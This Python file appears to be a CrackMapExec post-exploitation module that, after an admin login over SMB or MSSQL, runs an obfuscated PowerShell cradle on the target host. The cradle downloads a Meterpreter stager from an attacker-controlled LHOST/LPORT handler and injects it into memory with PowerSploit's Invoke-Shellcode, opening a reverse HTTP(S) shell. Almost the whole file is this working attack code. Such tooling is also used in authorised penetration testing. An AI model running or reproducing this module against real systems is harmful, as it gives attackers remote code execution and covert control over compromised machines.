from cme.helpers.powershell import *
from sys import exit

class CMEModule:
    '''
        Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
        Module by @byt3bl33d3r
    '''
    name = 'met_inject'
    description = "Downloads the Meterpreter stager and injects it into memory"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            LHOST    IP hosting the handler
            LPORT    Handler port
            PAYLOAD  Payload to inject: reverse_http or reverse_https (default: reverse_https)
            PROCID   Process ID to inject into (default: current powershell process)
        '''

        self.met_payload = 'reverse_https'
        self.procid = None

        if not 'LHOST' in module_options or not 'LPORT' in module_options:
            context.log.error('LHOST and LPORT options are required!')
            exit(1)

        if 'PAYLOAD' in module_options:
            self.met_payload = module_options['PAYLOAD']

        if 'PROCID' in module_options:
            self.procid = module_options['PROCID']

        self.lhost = module_options['LHOST']
        self.lport = module_options['LPORT']

        self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-Shellcode.ps1')

    def on_admin_login(self, context, connection):
        #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
        #so now we have to manually generate a valid Meterpreter request URL and download + exec the staged shellcode

        payload = """$CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}
        $SumTest = $False
        while ($SumTest -eq $False)
        {{
            $GeneratedUri = $CharArray | Get-Random -Count 4
            $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
        }}
        $RequestUri = -join $GeneratedUri
        $Request = "{}://{}:{}/$($RequestUri)"
        $WebClient = New-Object System.Net.WebClient
        [Byte[]]$bytes = $WebClient.DownloadData($Request)
        Invoke-Shellcode -Force -Shellcode $bytes""".format('http' if self.met_payload == 'reverse_http' else 'https',
                                                            self.lhost,
                                                            self.lport)

        if self.procid:
            payload += " -ProcessID {}".format(self.procid)

        launcher = gen_ps_iex_cradle(context, 'Invoke-Shellcode.ps1', payload, post_back=False)

        connection.ps_execute(launcher, force_ps32=True)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-Shellcode.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            request.wfile.write(self.ps_script)
            request.stop_tracking_host()
        else:
            request.send_response(404)
            request.end_headers()